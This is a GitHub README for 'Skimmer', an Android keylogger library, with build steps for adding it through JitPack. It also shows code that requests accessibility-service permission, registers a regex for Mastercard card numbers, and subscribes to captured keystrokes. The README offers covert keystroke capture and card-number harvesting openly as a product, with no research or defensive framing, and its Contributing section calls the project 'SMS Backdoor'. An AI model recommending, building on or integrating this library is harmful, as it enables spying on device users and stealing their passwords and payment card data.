[![Release](https://jitpack.io/v/evilthreads669966/skimmer.svg)](https://jitpack.io/#evilthreads669966/skimmer)&nbsp;&nbsp;[![API](https://img.shields.io/badge/API-16%2B-brightgreen.svg?style=plastic)](https://android-arsenal.com/api?level=16)
<pre>
 ________                                        ,---------. .---.  .---.     .-''-.          .-------.     ,-----.      .---.    .-./`)     _______      .-''-.   
|        |    .-,       .-,       .-,            \          \|   |  |_ _|   .'_ _   \         \  _(`)_ \  .'  .-,  '.    | ,_|    \ .-.')   /   __  \   .'_ _   \  
|   .----' ,-.|  \ _ ,-.|  \ _ ,-.|  \ _          `--.  ,---'|   |  ( ' )  / ( ` )   '        | (_ o._)| / ,-.|  \ _ \ ,-./  )    / `-' \  | ,_/  \__) / ( ` )   ' 
|  _|____  \  '_ /  |\  '_ /  |\  '_ /  |            |   \   |   '-(_{;}_). (_ o _)  |        |  (_,_) /;  \  '_ /  | :\  '_ '`)   `-'`"`,-./  )      . (_ o _)  | 
|_( )_   | _`,/ \ _/ _`,/ \ _/ _`,/ \ _/             :_ _:   |      (_,_) |  (_,_)___|        |   '-.-' |  _`,/ \ _/  | > (_)  )   .---. \  '_ '`)    |  (_,_)___| 
(_ o._)__|(  '\_/ \ (  '\_/ \ (  '\_/ \              (_I_)   | _ _--.   | '  \   .---.        |   |     : (  '\_/ \   ;(  .  .-'   |   |  > (_)  )  __'  \   .---. 
|(_,_)     `"/  \  ) `"/  \  ) `"/  \  )            (_(=)_)  |( ' ) |   |  \  `-'    /        |   |      \ `"/  \  ) /  `-'`-'|___ |   | (  .  .-'_/  )\  `-'    / 
|   |        \_/``"    \_/``"    \_/``"              (_I_)   (_{;}_)|   |   \       /         /   )       '. \_/``".'    |        \|   |  `-'`-'     /  \       /  
'---'                                                '---'   '(_,_) '---'    `'-..-'          `---'         '-----'      `--------`'---'    `._____.'    `'-..-'   
 ________                                        ,---------. .---.  .---.     .-''-.           ________     .-''-.   ______        .-'''-.                         
|        |    .-,       .-,       .-,            \          \|   |  |_ _|   .'_ _   \         |        |  .'_ _   \ |    _ `''.   / _     \                        
|   .----' ,-.|  \ _ ,-.|  \ _ ,-.|  \ _          `--.  ,---'|   |  ( ' )  / ( ` )   '        |   .----' / ( ` )   '| _ | ) _  \ (`' )/`--'                        
|  _|____  \  '_ /  |\  '_ /  |\  '_ /  |            |   \   |   '-(_{;}_). (_ o _)  |        |  _|____ . (_ o _)  ||( ''_'  ) |(_ o _).                           
|_( )_   | _`,/ \ _/ _`,/ \ _/ _`,/ \ _/             :_ _:   |      (_,_) |  (_,_)___|        |_( )_   ||  (_,_)___|| . (_) `. | (_,_). '.                         
(_ o._)__|(  '\_/ \ (  '\_/ \ (  '\_/ \              (_I_)   | _ _--.   | '  \   .---.        (_ o._)__|'  \   .---.|(_    ._) '.---.  \  :                        
|(_,_)     `"/  \  ) `"/  \  ) `"/  \  )            (_(=)_)  |( ' ) |   |  \  `-'    /        |(_,_)     \  `-'    /|  (_.\.' / \    `-'  |                        
|   |        \_/``"    \_/``"    \_/``"              (_I_)   (_{;}_)|   |   \       /         |   |       \       / |       .'   \       /                         
'---'                                                '---'   '(_,_) '---'    `'-..-'          '---'        `'-..-'  '-----'`      `-...-'                          
                                                                                                                                                          
</pre>
# Skimmer
### A fast, inexpensive, coroutine based keylogger library for Android allowing for better logging of keystrokes by ridding yourself of the unnecessary overhead of threads.
1. Add the JitPack repository to your project's build.gradle
```gradle
allprojects {
	repositories {
		...
		maven { url 'https://jitpack.io' }
	}
}
```
2. Add the dependency to your app's build.gradle
```gradle
dependencies {
        implementation 'com.github.evilthreads669966:skimmer:1.5'
}
```
3. Request the accessibility service permission for your app.
```kotlin
Keylogger.requestPermission(this)
```
4. (optional) Add any regular expressions to match
```kotlin
//mastercard 
//but this pattern wasn't working for me upon development. I am not very good with them.
Keylogger.addPattern("^5[1-5][0-9]{14}\\$")
```
5. Subscribe to keystrokes
```kotlin
Keylogger.subscribe { entry ->
    //do something with keystrokes here
}
```
## Ask a Question?
- Use [Github issues](https://github.com/evilthreads669966/skimmer/issues)
- Send an email to evilthreads669966@gmail.com

## Reporting issues
Found a bug on a specific feature? Open an issue on [Github issues](https://github.com/evilthreads669966/skimmer/issues)

## Contributing

SMS Backdoor is released under the [Apache 2.0 license](https://github.com/evilthreads669966/skimmer/blob/master/LICENSE). If you would like to contribute
something, or simply want to hack then this document should help you get started.

### Code of Conduct
- Please refrain from using any profanity
- Please be respectful on [GitHub Issues](https://github.com/evilthreads669966/skimmer/issues)
- Have fun

### [Pull Requests](https://github.com/evilthreads669966/skimmer/pulls)
- Please create a branch prefixed with what you're working on.
    - FEATURE_ADDING_SOMETHING
    - BUG_FIXING_SOMETHING
    - REFACTOR_CHANGING_SOMETHING
- Once you're done with your commits to this branch hit a [pull request](https://github.com/evilthreads669966/skimmer/pulls) off and I'll look at it and most likely accept it if it looks good.

### Using [GitHub Issues](https://github.com/evilthreads669966/skimmer/issues)
We use [GitHub issues](https://github.com/evilthreads669966/skimmer/issues) to track bugs and enhancements.
- If you find a bug please fill out an issue report. Provide as much information as possible.
- If you think of a great idea please fill out an issue as a proposal for your idea.

### Code Conventions
None of these is essential for a pull request, but they will all help.  They can also be
added after the original pull request but before a merge.

- We use idiomatic kotlin conventions
- Add yourself as an `@author` to the `.kt` files that you modify or create.
- Add some comments
- A few unit tests would help a lot as well -- someone has to do it.
- If you are able to provide a unit test then do.
    - Because of the types of libraries I develop often times it is hard to test.


### Working with the code
If you don't have an IDE preference we would recommend that you use
[Android Studio](https://developer.android.com/studio/)
## Contributors
This project exists thanks to all the people who contribute.
<a href="https://github.com/evilthreads669966/skimmer/graphs/contributors"><img src="https://opencollective.com/skimmer/contributors.svg?width=890&button=false" /></a>
## Talking about Skimmer
### Articles
* [Android Keylogger](https://medium.com/@chrisbasinger/skimmer-android-library-77d5d16b1355)
## License
```
Copyright 2020 Chris Basinger

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
```
